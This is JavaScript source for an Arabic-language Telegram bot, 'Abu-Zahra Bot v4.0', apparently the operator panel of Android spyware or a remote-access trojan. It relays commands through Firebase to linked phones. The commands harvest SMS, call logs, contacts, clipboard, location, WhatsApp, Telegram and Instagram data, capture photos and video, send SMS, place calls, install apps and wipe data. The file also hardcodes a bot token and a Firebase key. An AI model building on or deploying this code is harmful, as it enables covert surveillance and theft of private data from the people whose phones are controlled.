const TelegramBot = require('node-telegram-bot-api');

// ============ CONFIG ============
const BOT_TOKEN = process.env.BOT_TOKEN || '8743374928:AAGShUT6RrMfSBQHA6NZsb1nw9xRqA6_9bw';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '7344776596';
const FIREBASE_API_KEY = process.env.FIREBASE_API_KEY || '91b6cd08b16f5ad4cc62f88674bcff91fb5041e3';
const FIREBASE_DB_URL = process.env.FIREBASE_DATABASE_URL || 'https://studio-7073076148-6afe0-default-rtdb.firebaseio.com';

// ============ FIREBASE REST API ============
async function fbPush(path, data) {
  try {
    const url = `${FIREBASE_DB_URL}/${path}.json?auth=${FIREBASE_API_KEY}`;
    const res = await fetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
    if (!res.ok) console.error('[FB] Push failed:', res.status);
    return res.ok;
  } catch (e) { console.error('[FB] Push error:', e.message); return false; }
}

async function fbGet(path) {
  try {
    const url = `${FIREBASE_DB_URL}/${path}.json?auth=${FIREBASE_API_KEY}`;
    const res = await fetch(url);
    return res.ok ? await res.json() : null;
  } catch (e) { return null; }
}

async function fbDelete(path) {
  try {
    const url = `${FIREBASE_DB_URL}/${path}.json?auth=${FIREBASE_API_KEY}`;
    const res = await fetch(url, { method: 'DELETE' });
    return res.ok;
  } catch (e) { return false; }
}

// ============ BOT INIT ============
const bot = new TelegramBot(BOT_TOKEN, { polling: true, restart: true });

function isAdmin(msg) { return msg.chat.id.toString() === ADMIN_CHAT_ID; }
function isAdminCb(query) { return query.from.id.toString() === ADMIN_CHAT_ID; }

// ============ GET DEVICES FROM FIREBASE ONLY ============
async function getDevices() {
  const fbDevices = await fbGet('devices');
  if (!fbDevices) return [];
  return Object.keys(fbDevices).map(id => {
    const d = fbDevices[id];
    return {
      id,
      name: d.name || d.brand + ' ' + d.model || id.slice(0, 10),
      model: d.model || '--',
      brand: d.brand || '--',
      battery: d.battery || '--',
      active: d.active || false,
    };
  });
}

// ============ POLL RESULT FROM FIREBASE ============
function pollResult(chatId, deviceId, command, deviceName) {
  let attempts = 0;
  const timer = setInterval(async () => {
    attempts++;
    if (attempts > 30) { clearInterval(timer); safeSend(chatId, `⏰ انتهت مهلة "${command}"`); return; }
    try {
      const result = await fbGet(`devices/${deviceId}/result`);
      if (result && result.command === command) {
        clearInterval(timer);
        await fbDelete(`devices/${deviceId}/result`);
        const resultStr = typeof result.result === 'string' ? result.result.slice(0, 4000) : JSON.stringify(result.result || result, null, 2).slice(0, 4000);
        safeSend(chatId, `📥 نتيجة: ${command}\n📱 ${deviceName}\n\n${resultStr}`);
      }
    } catch {}
  }, 3000);
}

// ============ SEND COMMAND DIRECTLY TO APP VIA FIREBASE ============
async function sendCommand(deviceId, command, params = {}, chatId) {
  const devices = await getDevices();
  const device = devices.find(d => d.id === deviceId);
  const deviceName = device ? device.name : 'جهاز';
  const ok = await fbPush(`devices/${deviceId}/command`, { command, params, timestamp: Date.now(), source: 'telegram' });
  pollResult(chatId, deviceId, command, deviceName);
  return { ok, deviceName };
}

// ============ SAFE SEND ============
function safeSend(chatId, text, opts = {}) {
  return bot.sendMessage(chatId, text, opts).catch(() => {
    const cleanOpts = { ...opts, parse_mode: undefined };
    const cleanText = text.replace(/[*_`~]/g, '');
    return bot.sendMessage(chatId, cleanText, cleanOpts).catch(() => {});
  });
}

// ============ MAIN MENU ============
function getMainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📱 الأجهزة المتصلة', callback_data: 'panel_devices' }, { text: '📊 الإحصائيات', callback_data: 'panel_stats' }],
        [{ text: '🎮 إرسال أمر', callback_data: 'panel_send' }, { text: '📡 عرض البيانات', callback_data: 'panel_data' }],
        [{ text: '🔗 ربط جهاز جديد', callback_data: 'panel_link' }, { text: '📋 سجل الأوامر', callback_data: 'panel_logs' }],
        [{ text: '🛡️ أوامر سريعة', callback_data: 'panel_quick' }],
        [{ text: '⚙️ الإعدادات', callback_data: 'panel_settings' }, { text: '❓ المساعدة', callback_data: 'panel_help' }],
      ],
    },
  };
}

// ============ /start ============
bot.onText(/\/start/, (msg) => {
  if (!isAdmin(msg)) return safeSend(msg.chat.id, '⛔ غير مصرح');
  safeSend(msg.chat.id, '🛡️ بوت أبو الزهراء v4.0\n👨‍💻 لوحة التحكم المتكاملة\n🔥 Firebase Only - مباشر\n\n🎬 اختر من القائمة:', getMainMenu());
});

// ============ CALLBACK HANDLER ============
bot.on('callback_query', async (query) => {
  if (!isAdminCb(query)) return;
  const chatId = query.message.chat.id;
  const data = query.data;
  try { bot.answerCallbackQuery(query.id).catch(() => {}); } catch {}

  try {
    if (data === 'panel_home' || data === 'panel_main') {
      safeSend(chatId, '🛡️ بوت أبو الزهراء v4.0\n🔥 Firebase Only\n\n🎬 اختر من القائمة:', getMainMenu());
      return;
    }

    // ======= DEVICES =======
    if (data === 'panel_devices' || data === 'back_devices') {
      const devices = await getDevices();
      if (devices.length === 0) {
        return safeSend(chatId, '📱 لا توجد أجهزة متصلة.\nاستخدم "🔗 ربط جهاز" لإنشاء رمز.', {
          reply_markup: { inline_keyboard: [[{ text: '🔗 ربط جهاز', callback_data: 'panel_link' }], [{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] }
        });
      }
      let text = '📱 الأجهزة المتصلة\n\n';
      const rows = [];
      devices.forEach((d, i) => {
        const s = d.active ? '🟢' : '🔴';
        text += `${i + 1}. ${s} ${d.name}\n   ${d.brand} ${d.model} | 🔋 ${d.battery}%\n\n`;
        rows.push([{ text: `${s} ${d.name}`, callback_data: `device_${d.id}` }]);
      });
      rows.push([{ text: '🔗 ربط جهاز جديد', callback_data: 'panel_link' }]);
      rows.push([{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]);
      safeSend(chatId, text, { reply_markup: { inline_keyboard: rows } });
      return;
    }

    // ======= DEVICE DETAIL =======
    if (data.startsWith('device_')) {
      const deviceId = data.replace('device_', '');
      const devices = await getDevices();
      const d = devices.find(x => x.id === deviceId);
      if (!d) return safeSend(chatId, '❌ الجهاز غير موجود');
      const st = d.active ? '🟢 متصل' : '🔴 غير متصل';
      safeSend(chatId,
        `📱 تفاصيل الجهاز\n\n🏷️ الاسم: ${d.name}\n📶 الحالة: ${st}\n📲 ${d.brand} ${d.model}\n🔋 البطارية: ${d.battery}%`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: '🎮 إرسال أمر', callback_data: `send_${deviceId}` }, { text: '📊 البيانات', callback_data: `data_${deviceId}` }],
              [{ text: '📡 الشبكة والاتصال', callback_data: `cat_${deviceId}_network` }, { text: '📱 الصوت والتنبيه', callback_data: `cat_${deviceId}_media` }],
              [{ text: '📱 أوامر الهاتف', callback_data: `cat_${deviceId}_phone` }, { text: '📸 الكاميرا', callback_data: `cat_${deviceId}_camera` }],
              [{ text: '⚙️ الإعدادات', callback_data: `cat_${deviceId}_settings_cat` }, { text: '📡 المراقبة', callback_data: `cat_${deviceId}_monitor` }],
              [{ text: '📲 التطبيقات', callback_data: `cat_${deviceId}_apps` }, { text: '🎮 متقدم', callback_data: `cat_${deviceId}_advanced` }],
              [{ text: '❌ فصل الجهاز', callback_data: `unlink_${deviceId}` }],
              [{ text: '🔙 الأجهزة', callback_data: 'panel_devices' }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }],
            ]
          }
        }
      );
      return;
    }

    // ======= SEND COMMAND MENU =======
    if (data.startsWith('send_') && !data.startsWith('send_sms')) {
      const deviceId = data.replace('send_', '');
      const devices = await getDevices();
      const d = devices.find(x => x.id === deviceId);
      safeSend(chatId, `🎮 إرسال أمر إلى: ${d ? d.name : 'جهاز'}\n\nاختر القائمة:`, {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📡 الشبكة', callback_data: `cat_${deviceId}_network` }, { text: '📱 الصوت', callback_data: `cat_${deviceId}_media` }],
            [{ text: '📱 الهاتف', callback_data: `cat_${deviceId}_phone` }, { text: '📸 الكاميرا', callback_data: `cat_${deviceId}_camera` }],
            [{ text: '⚙️ الإعدادات', callback_data: `cat_${deviceId}_settings_cat` }, { text: '📡 المراقبة', callback_data: `cat_${deviceId}_monitor` }],
            [{ text: '📲 التطبيقات', callback_data: `cat_${deviceId}_apps` }, { text: '🎮 متقدم', callback_data: `cat_${deviceId}_advanced` }],
            [{ text: '🔙 تفاصيل الجهاز', callback_data: `device_${deviceId}` }],
          ]
        }
      });
      return;
    }

    // ======= COMMAND CATEGORIES =======
    const categories = {
      network: [
        ['📶 معلومات الواي فاي', 'get_wifi_info'], ['📡 معلومات الشبكة', 'get_network_info'], ['📍 الموقع', 'get_location'],
        ['✅ تشغيل WiFi', 'enable_wifi'], ['❌ إيقاف WiFi', 'disable_wifi'],
        ['✅ تشغيل بلوتوث', 'enable_bluetooth'], ['❌ إيقاف بلوتوث', 'disable_bluetooth'],
        ['✅ وضع الطيران', 'airplane_on'], ['❌ إيقاف الطيران', 'airplane_off'],
      ],
      media: [
        ['🔔 تشغيل التنبيه', 'ring'], ['📳 اهتزاز', 'vibrate'],
        ['🔦 تشغيل الفلاش', 'torch_on'], ['🔦 إطفاء الفلاش', 'torch_off'],
        ['🔊 رفع الصوت', 'volume_up'], ['🔔 خفض الصوت', 'volume_down'],
        ['🔇 كتم الصوت', 'silent_mode'], ['🔊 وضع العام', 'normal_mode'],
      ],
      phone: [
        ['📜 قراءة الرسائل', 'get_sms'], ['📞 سجل المكالمات', 'get_calls'],
        ['📋 جهات الاتصال', 'get_contacts'], ['📋 الحافظة', 'get_clipboard'],
        ['📱 معلومات الجهاز', 'get_info'], ['📊 حالة البطارية', 'get_battery'],
        ['🔒 قفل الجهاز', 'lock_phone'], ['🔁 إعادة تشغيل', 'reboot'], ['⚡ إيقاف التشغيل', 'shutdown'],
      ],
      camera: [
        ['📷 كاميرا خلفية', 'back_camera'], ['🤳 كاميرا أمامية', 'front_camera'],
        ['📸 التقاط صورة', 'take_photo'], ['📼 تسجيل فيديو', 'record_video'],
      ],
      settings_cat: [
        ['✅ تشغيل WiFi', 'enable_wifi'], ['❌ إيقاف WiFi', 'disable_wifi'],
        ['✅ تشغيل بلوتوث', 'enable_bluetooth'], ['❌ إيقاف بلوتوث', 'disable_bluetooth'],
        ['✅ وضع الطيران', 'airplane_on'], ['❌ إيقاف الطيران', 'airplane_off'],
        ['💡 إطفاء الشاشة', 'screen_off'], ['💡 تشغيل الشاشة', 'screen_on'],
      ],
      monitor: [
        ['📍 الموقع', 'get_location'], ['📊 البطارية', 'get_battery'], ['📱 معلومات', 'get_info'],
        ['📲 التطبيقات', 'get_apps'], ['📜 الرسائل', 'get_sms'], ['📞 المكالمات', 'get_calls'],
        ['📋 جهات الاتصال', 'get_contacts'], ['📋 الحافظة', 'get_clipboard'], ['📥 جلب الكل', 'get_all'],
      ],
      apps: [
        ['📱 التطبيقات المثبتة', 'get_apps'], ['💬 واتساب', 'get_whatsapp'],
        ['✈️ تيلجرام', 'get_telegram'], ['📸 انستغرام', 'get_instagram'],
        ['🔔 الإشعارات', 'get_notifications'], ['📞 سجل الاستخدام', 'get_usage_stats'],
      ],
      advanced: [
        ['📲 تثبيت تطبيق', 'install_app'], ['🗑️ حذف تطبيق', 'uninstall_app'],
        ['📤 إرسال SMS', 'send_sms'], ['📞 إجراء مكالمة', 'make_call'],
        ['📄 فتح رابط', 'open_url'], ['⌨️ إدخال نص', 'type_text'],
        ['🔄 نقل ملف', 'transfer_file'], ['📥 تحميل ملف', 'download_file'],
        ['💥 حذف بيانات', 'clear_app_data'],
      ],
    };

    for (const [catName, commands] of Object.entries(categories)) {
      if (data.endsWith(`_${catName}`)) {
        const deviceId = data.split('_')[0];
        const catTitles = {
          network: '📡 أوامر الشبكة والاتصال', media: '📱 أوامر الصوت والتنبيه',
          phone: '📱 أوامر الهاتف', camera: '📸 أوامر الكاميرا',
          settings_cat: '⚙️ أوامر الإعدادات', monitor: '📡 أوامر المراقبة',
          apps: '📲 أوامر التطبيقات', advanced: '🎮 أوامر متقدمة',
        };
        const rows = commands.map(([label, cmd]) => [{ text: label, callback_data: `cmd_${deviceId}_${cmd}` }]);
        rows.push([{ text: '🔙 إرسال أمر', callback_data: `send_${deviceId}` }]);
        safeSend(chatId, catTitles[catName], { reply_markup: { inline_keyboard: rows } });
        return;
      }
    }

    // ======= EXECUTE COMMAND =======
    if (data.startsWith('cmd_')) {
      const parts = data.split('_');
      const deviceId = parts[1];
      const command = parts.slice(2).join('_');
      const { ok, deviceName } = await sendCommand(deviceId, command, {}, chatId);
      safeSend(chatId,
        `📤 تم الإرسال مباشرة\n📱 ${deviceName}\n🎮 ${command}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة من التطبيق...`,
        { reply_markup: { inline_keyboard: [[{ text: '🔙 الجهاز', callback_data: `device_${deviceId}` }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }]] } }
      );
      return;
    }

    // ======= UNLINK =======
    if (data.startsWith('unlink_')) {
      const deviceId = data.replace('unlink_', '');
      const devices = await getDevices();
      const d = devices.find(x => x.id === deviceId);
      await fbDelete(`devices/${deviceId}`);
      safeSend(chatId, `✅ تم فصل "${d ? d.name : 'الجهاز'}"`, {
        reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
      });
      return;
    }

    // ======= DATA VIEW =======
    if (data.startsWith('data_')) {
      const deviceId = data.replace('data_', '');
      const devices = await getDevices();
      const d = devices.find(x => x.id === deviceId);
      safeSend(chatId, `📊 عرض بيانات: ${d ? d.name : 'جهاز'}`, {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📜 الرسائل SMS', callback_data: `viewdata_${deviceId}_sms` }, { text: '📞 المكالمات', callback_data: `viewdata_${deviceId}_calls` }],
            [{ text: '📋 جهات الاتصال', callback_data: `viewdata_${deviceId}_contacts` }, { text: '📍 الموقع', callback_data: `viewdata_${deviceId}_location` }],
            [{ text: '📊 البطارية', callback_data: `viewdata_${deviceId}_battery` }, { text: '📱 معلومات', callback_data: `viewdata_${deviceId}_info` }],
            [{ text: '📲 التطبيقات', callback_data: `viewdata_${deviceId}_apps` }],
            [{ text: '🔙 الجهاز', callback_data: `device_${deviceId}` }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }],
          ]
        }
      });
      return;
    }

    // ======= VIEW DATA =======
    if (data.startsWith('viewdata_')) {
      const parts = data.split('_');
      const deviceId = parts[1];
      const dataType = parts.slice(2).join('_');
      const devices = await getDevices();
      const d = devices.find(x => x.id === deviceId);
      const fbData = await fbGet(`devices/${deviceId}/data/${dataType}`);
      if (fbData) {
        const dataStr = typeof fbData === 'string' ? fbData.slice(0, 4000) : JSON.stringify(fbData, null, 2).slice(0, 4000);
        safeSend(chatId, `📊 ${dataType}: ${d ? d.name : 'جهاز'}\n\n${dataStr}`);
      } else {
        safeSend(chatId, `📭 لا توجد بيانات "${dataType}"\nأرسل الأمر get_${dataType} أولاً`, {
          reply_markup: { inline_keyboard: [[{ text: '🔙', callback_data: `data_${deviceId}` }]] }
        });
      }
      return;
    }

    // ======= STATS FROM FIREBASE =======
    if (data === 'panel_stats') {
      const fbDevices = await fbGet('devices');
      const allDevices = fbDevices ? Object.keys(fbDevices) : [];
      const activeDevices = allDevices.filter(id => fbDevices[id]?.active);
      const cmdLog = await fbGet('commandLog') || {};
      const logEntries = Object.values(cmdLog);
      const totalCmds = logEntries.length;
      const completedCmds = logEntries.filter(e => e.status === 'completed').length;
      const rate = totalCmds > 0 ? Math.round((completedCmds / totalCmds) * 100) : 0;

      safeSend(chatId,
        `📊 الإحصائيات (Firebase)\n\n📱 الأجهزة: ${allDevices.length} (${activeDevices.length} متصل)\n🎮 الأوامر: ${totalCmds} (${completedCmds} ✅)\n📊 نسبة النجاح: ${rate}%\n🔥 فايربيس: متصل ✅\n🤖 البوت: يعمل ✅`,
        { reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] } }
      );
      return;
    }

    if (data === 'panel_send') {
      safeSend(chatId, '🎮 إرسال أمر مباشر\n\n/send <رقم> <أمر> [param=value]', {
        reply_markup: { inline_keyboard: [[{ text: '📱 عرض الأجهزة', callback_data: 'panel_devices' }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
      });
      return;
    }

    if (data === 'panel_data') {
      safeSend(chatId, '📡 عرض البيانات\n\n/data <رقم> [نوع]', {
        reply_markup: { inline_keyboard: [[{ text: '📱 عرض الأجهزة', callback_data: 'panel_devices' }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
      });
      return;
    }

    // ======= LINK - CODE FROM FIREBASE =======
    if (data === 'panel_link') {
      safeSend(chatId, '🔗 جاري إنشاء رمز ربط من Firebase...', {
        reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] }
      });

      // Generate code and store in Firebase
      const code = Math.floor(100000 + Math.random() * 900000).toString();
      const expiresAt = Date.now() + 10 * 60 * 1000;

      // Push code to Firebase
      await fbPush(`linkCodes/${code}`, { code, expiresAt, used: false, createdAt: Date.now() });

      // Read it back from Firebase to confirm (Firebase is the source of truth)
      const fbCode = await fbGet(`linkCodes/${code}`);

      if (fbCode && fbCode.code === code) {
        safeSend(chatId,
          `🔗 رمز الربط من Firebase\n\n🔢 الرمز: ${code}\n⏱️ صالح لمدة 10 دقائق\n📱 أدخله في تطبيق الأندرويد\n🔥 تم التأكيد من Firebase ✅`,
          {
            reply_markup: { inline_keyboard: [
              [{ text: '🔄 إنشاء رمز جديد', callback_data: 'panel_link' }],
              [{ text: '🏠 الرئيسية', callback_data: 'panel_home' }],
            ]}
          }
        );
      } else {
        safeSend(chatId, '❌ فشل في إنشاء الرمز من Firebase', {
          reply_markup: { inline_keyboard: [[{ text: '🔄 إعادة المحاولة', callback_data: 'panel_link' }, { text: '🏠 الرئيسية', callback_data: 'panel_home' }]] }
        });
      }
      return;
    }

    // ======= LOGS FROM FIREBASE =======
    if (data === 'panel_logs') {
      const cmdLog = await fbGet('commandLog') || {};
      const entries = Object.values(cmdLog).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 15);
      if (!entries.length) return safeSend(chatId, '📋 لا أوامر مسجلة في Firebase.', { reply_markup: { inline_keyboard: [[{ text: '🔙', callback_data: 'panel_home' }]] } });
      let text = '📋 سجل الأوامر (Firebase):\n\n';
      entries.forEach((c, i) => {
        const s = c.status === 'completed' ? '✅' : c.status === 'sent' ? '📤' : '❌';
        text += `${i + 1}. ${s} ${c.command || '--'} ← ${c.deviceName || '--'}\n`;
      });
      safeSend(chatId, text, { reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] } });
      return;
    }

    // ======= SETTINGS =======
    if (data === 'panel_settings') {
      safeSend(chatId, `⚙️ الإعدادات\n\n🤖 معرف المسؤول: ${ADMIN_CHAT_ID}\n🔥 Firebase: studio-7073076148-6afe0\n🔑 API Key: ${FIREBASE_API_KEY.slice(0, 10)}...\n📦 النظام: Firebase Only (لا قاعدة بيانات محلية)`, {
        reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] }
      });
      return;
    }

    // ======= HELP =======
    if (data === 'panel_help') {
      safeSend(chatId,
        '❓ المساعدة - أبو الزهراء v4.0\n\n' +
        '/start - لوحة التحكم\n/devices - الأجهزة\n/send <رقم> <أمر> - إرسال أمر مباشر\n' +
        '/link - رمز ربط من Firebase\n/unlink <رقم> - فصل\n/stats - إحصائيات Firebase\n\n' +
        '🎮 أوامر مباشرة:\n' +
        'ping | vibrate | ring | get_sms | get_calls | get_contacts | get_location\n' +
        'get_info | get_battery | get_apps | get_whatsapp | get_telegram\n' +
        'lock_phone | reboot | enable_wifi | disable_wifi | torch_on | torch_off',
        { reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'panel_home' }]] } }
      );
      return;
    }

    // ======= QUICK COMMANDS =======
    if (data === 'panel_quick') {
      safeSend(chatId, '🛡️ أوامر سريعة (مباشرة عبر Firebase)\n\nاختر الأمر:', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📡 ping', callback_data: 'quick_ping' }, { text: '📳 اهتزاز', callback_data: 'quick_vibrate' }, { text: '🔔 تنبيه', callback_data: 'quick_ring' }],
            [{ text: '📜 SMS', callback_data: 'quick_get_sms' }, { text: '📞 مكالمات', callback_data: 'quick_get_calls' }, { text: '📍 موقع', callback_data: 'quick_get_location' }],
            [{ text: '📊 بطارية', callback_data: 'quick_get_battery' }, { text: '📱 معلومات', callback_data: 'quick_get_info' }, { text: '📲 تطبيقات', callback_data: 'quick_get_apps' }],
            [{ text: '📋 جهات', callback_data: 'quick_get_contacts' }, { text: '📋 حافظة', callback_data: 'quick_get_clipboard' }, { text: '📥 الكل', callback_data: 'quick_get_all' }],
            [{ text: '💬 واتساب', callback_data: 'quick_get_whatsapp' }, { text: '✈️ تيلجرام', callback_data: 'quick_get_telegram' }],
            [{ text: '✅ WiFi', callback_data: 'quick_enable_wifi' }, { text: '❌ WiFi', callback_data: 'quick_disable_wifi' }],
            [{ text: '✅ بلوتوث', callback_data: 'quick_enable_bluetooth' }, { text: '❌ بلوتوث', callback_data: 'quick_disable_bluetooth' }],
            [{ text: '🔦 فلاش', callback_data: 'quick_torch_on' }, { text: '🔒 قفل', callback_data: 'quick_lock_phone' }, { text: '🔁 تشغيل', callback_data: 'quick_reboot' }],
            [{ text: '🔙 الرئيسية', callback_data: 'panel_home' }],
          ]
        }
      });
      return;
    }

    // ======= EXECUTE QUICK COMMAND =======
    if (data.startsWith('quick_')) {
      const command = data.replace('quick_', '');
      const devices = await getDevices();
      const target = devices.find(d => d.active) || devices[0];
      if (!target) return safeSend(chatId, '❌ لا أجهزة متصلة.', { reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'panel_home' }]] } });
      const { ok, deviceName } = await sendCommand(target.id, command, {}, chatId);
      safeSend(chatId, `📤 مباشر → ${deviceName}\n🎮 ${command}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`, {
        reply_markup: { inline_keyboard: [[{ text: '🔙 الرئيسية', callback_data: 'panel_home' }]] }
      });
      return;
    }

  } catch (e) {
    console.error('[Callback Error]', e.message);
    safeSend(chatId, `❌ خطأ: ${e.message}`, { reply_markup: { inline_keyboard: [[{ text: '🏠 الرئيسية', callback_data: 'panel_home' }]] } });
  }
});

// ============ TEXT COMMANDS ============
bot.onText(/\/devices/, async (msg) => {
  if (!isAdmin(msg)) return;
  const devices = await getDevices();
  if (!devices.length) return safeSend(msg.chat.id, '📱 لا توجد أجهزة.\nاستخدم /link لإنشاء رمز ربط.');
  let text = '📱 الأجهزة المتصلة:\n\n';
  devices.forEach((d, i) => { text += `${i + 1}. ${d.active ? '🟢' : '🔴'} ${d.name}\n   ${d.brand} ${d.model} | 🔋 ${d.battery}%\n\n`; });
  safeSend(msg.chat.id, text);
});

bot.onText(/\/send\s+(.+)/, async (msg) => {
  if (!isAdmin(msg)) return;
  const args = msg.text.split(' ').slice(1);
  const devices = await getDevices();
  if (!devices.length) return safeSend(msg.chat.id, '❌ لا توجد أجهزة.');
  const idx = parseInt(args[0]) - 1;
  if (idx < 0 || idx >= devices.length) return safeSend(msg.chat.id, `❌ رقم غير صحيح (1-${devices.length})`);
  const cmd = args[1];
  const params = {};
  for (let i = 2; i < args.length; i++) { if (args[i].includes('=')) { const [k, ...v] = args[i].split('='); params[k] = v.join('='); } }
  const { ok, deviceName } = await sendCommand(devices[idx].id, cmd, params, msg.chat.id);
  // Log command to Firebase
  await fbPush(`commandLog/${Date.now()}`, { command: cmd, deviceName, status: ok ? 'sent' : 'failed', source: 'telegram', timestamp: Date.now() });
  safeSend(msg.chat.id, `📤 مباشر → ${deviceName}\n🎮 ${cmd}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`);
});

// ============ /link - CODE FROM FIREBASE ============
bot.onText(/\/link/, async (msg) => {
  if (!isAdmin(msg)) return;
  const code = Math.floor(100000 + Math.random() * 900000).toString();
  const expiresAt = Date.now() + 10 * 60 * 1000;

  // Store in Firebase
  await fbPush(`linkCodes/${code}`, { code, expiresAt, used: false, createdAt: Date.now() });

  // Read back from Firebase to confirm
  const fbCode = await fbGet(`linkCodes/${code}`);

  if (fbCode && fbCode.code === code) {
    safeSend(msg.chat.id, `🔗 رمز الربط من Firebase\n\n🔢 الرمز: ${code}\n⏱️ صالح 10 دقائق\n📱 أدخله في تطبيق الأندرويد\n🔥 مؤكد من Firebase ✅`);
  } else {
    safeSend(msg.chat.id, '❌ فشل إنشاء الرمز');
  }
});

bot.onText(/\/unlink\s+(.+)/, async (msg) => {
  if (!isAdmin(msg)) return;
  const devices = await getDevices();
  const idx = parseInt(msg.text.split(' ')[1]) - 1;
  if (idx < 0 || idx >= devices.length) return safeSend(msg.chat.id, `❌ رقم غير صحيح (1-${devices.length})`);
  await fbDelete(`devices/${devices[idx].id}`);
  safeSend(msg.chat.id, `✅ تم فصل "${devices[idx].name}"`);
});

bot.onText(/\/stats/, async (msg) => {
  if (!isAdmin(msg)) return;
  const fbDevices = await fbGet('devices');
  const allDevices = fbDevices ? Object.keys(fbDevices) : [];
  const activeDevices = allDevices.filter(id => fbDevices[id]?.active);
  safeSend(msg.chat.id, `📊 الإحصائيات (Firebase)\n\n📱 الأجهزة: ${allDevices.length} (${activeDevices.length} متصل)\n🔥 فايربيس: متصل ✅\n🤖 البوت: يعمل ✅`);
});

bot.onText(/\/help/, (msg) => {
  if (!isAdmin(msg)) return;
  safeSend(msg.chat.id,
    '🆘 المساعدة - أبو الزهراء v4.0\n\n/start - لوحة التحكم\n/devices - الأجهزة\n/send <رقم> <أمر> - إرسال أمر\n/link - رمز ربط Firebase\n/unlink - فصل\n/stats - إحصائيات\n\n🎮 أوامر مباشرة:\nping | vibrate | ring | get_sms | get_calls | get_contacts | get_location | get_info | get_battery | get_apps | get_whatsapp | get_telegram | lock_phone | reboot | enable_wifi | disable_wifi | torch_on | torch_off'
  );
});

// ============ QUICK TEXT COMMANDS ============
bot.on('message', async (msg) => {
  if (!isAdmin(msg) || !msg.text || msg.text.startsWith('/')) return;
  const cmd = msg.text.trim().toLowerCase();
  const validCmds = [
    'ping','vibrate','ring','get_sms','get_calls','get_contacts','get_location',
    'get_info','get_battery','get_apps','get_gallery','get_wifi_info',
    'get_network_info','get_whatsapp','get_telegram','get_instagram',
    'get_clipboard','get_all','enable_wifi','disable_wifi',
    'enable_bluetooth','disable_bluetooth','torch_on','torch_off',
    'airplane_on','airplane_off','front_camera','back_camera',
    'lock_phone','reboot','shutdown','volume_up','volume_down',
    'silent_mode','normal_mode','screen_on','screen_off',
    'take_photo','record_video','get_notifications','get_usage_stats',
    'install_app','uninstall_app','send_sms','make_call',
    'open_url','type_text','transfer_file','download_file','clear_app_data'
  ];
  if (!validCmds.includes(cmd)) return;
  try {
    const devices = await getDevices();
    const target = devices.find(d => d.active) || devices[0];
    if (!target) return safeSend(msg.chat.id, '❌ لا أجهزة متصلة.');
    const { ok, deviceName } = await sendCommand(target.id, cmd, {}, msg.chat.id);
    await fbPush(`commandLog/${Date.now()}`, { command: cmd, deviceName, status: ok ? 'sent' : 'failed', source: 'telegram', timestamp: Date.now() });
    safeSend(msg.chat.id, `📤 مباشر → ${deviceName}\n🎮 ${cmd}\n🔥 ${ok ? '✅' : '❌'}\n⏳ انتظار النتيجة...`);
  } catch (e) { safeSend(msg.chat.id, '❌ خطأ: ' + e.message); }
});

// ============ ERROR HANDLING ============
bot.on('polling_error', (error) => { console.error('[Poll Error]', error.message); });
process.on('uncaughtException', (err) => { console.error('[Uncaught]', err.message); });
process.on('unhandledRejection', (err) => { console.error('[Unhandled]', err?.message || err); });

// ============ KEEP ALIVE ============
setInterval(() => { bot.getMe().then(m => console.log(`[OK] @${m.username} ${new Date().toISOString()}`)).catch(() => {}); }, 60000);

console.log('🤖 Abu-Zahra Bot v4.0 started');
console.log(`🔑 Admin: ${ADMIN_CHAT_ID}`);
console.log('🔥 Firebase RTDB - Only data source');
console.log('✅ No SQLite/Prisma - Firebase Only');
console.log('✅ Running permanently');
